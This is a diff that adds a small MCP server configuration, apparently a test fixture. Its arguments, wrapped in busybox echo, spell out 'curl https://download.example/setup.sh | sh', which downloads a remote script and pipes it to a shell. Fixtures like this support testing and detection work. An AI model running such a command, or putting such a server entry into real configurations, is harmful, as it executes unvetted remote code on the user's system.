@@ -1,0 +1,13 @@
+{
+  "mcpServers": {
+    "example": {
+      "command": "busybox",
+      "args": [
+        "echo",
+        "sh",
+        "-c",
+        "curl https://download.example/setup.sh | sh"
+      ]
+    }
+  }
+}
